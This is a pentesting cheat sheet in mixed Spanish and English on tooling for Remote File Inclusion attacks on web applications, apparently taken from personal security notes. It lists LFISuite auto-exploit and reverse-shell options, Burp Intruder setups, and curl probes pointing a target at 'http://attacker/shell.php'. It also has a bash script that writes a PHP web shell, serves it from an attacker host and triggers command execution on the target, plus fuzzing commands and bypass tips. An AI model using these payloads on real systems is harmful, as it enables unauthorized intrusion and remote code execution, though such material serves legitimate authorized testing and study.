---
aliases:
  - RFI Tooling
  - LFISuite RFI
  - Burp RFI
tags:
  - type/cheatsheet
  - vuln/rfi
  - technique/discovery
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Remote File Inclusion (RFI)]]'
  - '[[Burp Suite]]'
---
# RFI - Tooling

***

## LFISuite RFI Mode

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Repo | `git clone https://github.com/D35m0nd142/LFISuite` | Python — LFI/RFI auto-exploit. |
| Run interactive | `python LFISuite.py` | Menu-driven. |
| Scanner mode | `python LFISuite.py -t target.com -P /vuln.php` | Auto-scan. |
| Specific URL | `-u https://target/page?file=` | Direct URL. |
| RFI mode | Toggle en menu | RFI-specific. |
| Auto-exploit | Built-in shells (PHP, Perl, etc.) | Direct RCE. |
| Reverse shell | Drops shell + callback | Standard. |
| Tor support | `-T` flag | Anonymity. |
| Cookie support | `-c "session=..."` | Authenticated. |
| Custom shells | Edit `shells.php` con own | Customizable. |
| Stack detection | Identifies PHP / etc | Auto. |
| Verbose | `-v` | Debug. |
| Multi-vector probes | LFI + RFI combined | Comprehensive. |
^rfi-tool-lfisuite

___

## Burp Intruder + Payloads

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Mark position | Select param value en Repeater | Standard. |
| Sniper attack | Single position, multi-payloads | Default. |
| Payload set RFI | Custom list de RFI URLs | Manual. |
| Match conditions | Grep extract RCE indicators (`uid=`, `phpinfo`) | Validation. |
| Status code filter | 200 + content match | Standard. |
| Response length | Sort para anomaly detection | Visual. |
| Combine con Param Miner | Discover hidden params | Recon. |
| Combine con Hackvertor | Encoding payloads | Custom. |
| Burp Active Scan | Includes RFI checks | Built-in. |
| BCheck rules | Pro 2024+ RFI detection | Modern. |
| Logger++ filter | Filter RFI candidates | Pasivo. |
| Combine con Collaborator | OOB callbacks | Standard. |
^rfi-tool-burp

___

## Manual curl Scripts

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Single probe | `curl "https://target/?page=http://attacker/shell.php"` | Standard. |
| With custom port | `curl "...?page=http://attacker:8080/x"` | Non-standard port. |
| HTTPS attacker | `curl "...?page=https://attacker/x"` | TLS. |
| Pipe Collaborator | Use unique callback | Standard. |
| Loop variants | Bash for loop con multiple URLs | Bulk. |
| Atacante + curl combo | Run `python -m http.server` + curl probe | Standalone. |
| Encoded variants | URL-encode payload | Bypass. |
| Pipe a netcat | Listener para callback | Standard. |
| Combine con jq | Parse JSON responses | Pipeline. |
| Combine con xxd | Inspect raw bytes | Debug. |
| Send raw via netcat | Low-level HTTP | Edge. |
| Multipart upload + RFI | Combo upload + include | Multi-vector. |
^rfi-tool-curl

### Bash one-liner

```bash
TARGET="https://target/index.php"
PARAM="page"
ATTACKER_HOST="attacker.com"

# Setup attacker server
mkdir -p /tmp/rfi && cd /tmp/rfi
echo '<?php system($_GET["c"]); ?>' > shell.php
python3 -m http.server 80 &
SERVER_PID=$!

# Probe RFI
RESULT=$(curl -s "${TARGET}?${PARAM}=http://${ATTACKER_HOST}/shell.php&c=id")

if echo "$RESULT" | grep -qE 'uid=[0-9]+'; then
    echo "[+] RFI confirmed!"
    echo "$RESULT" | grep -oE 'uid=[0-9]+\([^)]*\)'
else
    echo "[-] No RFI"
fi

# Cleanup
kill $SERVER_PID
```

___

## Wordlists

| **Wordlist** | **Path / Source** | **Uso** |
|:---:|:---:|:---:|
| PayloadsAllTheThings - File Inclusion | https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion | Standard. |
| HackTricks - LFI/RFI | https://book.hacktricks.xyz/pentesting-web/file-inclusion | Referencia. |
| SecLists - File Inclusion | `seclists/Fuzzing/LFI/` | Standard. |
| Burp Intruder built-in | "RFI" payload set | Pro feature. |
| Custom URLs list | atacante's payload URLs | Targeted. |
| RFI cheatsheet OWASP | OWASP Testing Guide | Standard. |
| Bug bounty disclosed | HackerOne RFI reports | Real-world. |
| Combine wordlists con WAF bypass | Multi-vector payloads | Compound. |
| `php://` wrappers list | Specific wrappers | PHP-only. |
| HTTPS / FTP / SMB schemes | Multi-protocol | Standard. |
| Encoding variants | URL/double/hex | Bypass. |
| Custom polyglot URLs | Hosted payload servers | Per-engagement. |
^rfi-tool-wordlists

___

## Otros Tools

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| dotdotpwn (LFI/RFI mode) | https://github.com/wireghoul/dotdotpwn | Old but functional. |
| nuclei templates | `nuclei -t vulnerabilities/generic/rfi.yaml` | Bulk scan. |
| ffuf | `ffuf -u 'https://target/?p=FUZZ' -w rfi-payloads.txt -mr 'uid='` | Standard fuzzer. |
| wfuzz | Alternative | Same family. |
| OWASP ZAP | Active scanner free alt | Standard. |
| dalfox | XSS/RFI scanner | Adjacent. |
| Combine con `gau`/`waybackurls` | URL discovery | Pre-fuzz. |
| sqlmap (if combined SQLi+RFI) | Multi-vector | Edge. |
| Custom Python scripts | `requests` programmable | Custom. |
| Burp Suite Pro Active Scan | Built-in RFI checks | Standard. |
| Acunetix / Netsparker | Commercial scanners | Enterprise. |
| Subjack-like for SDT combo | Discover atacante's claimable subdomain | SDT chain. |
^rfi-tool-others

***
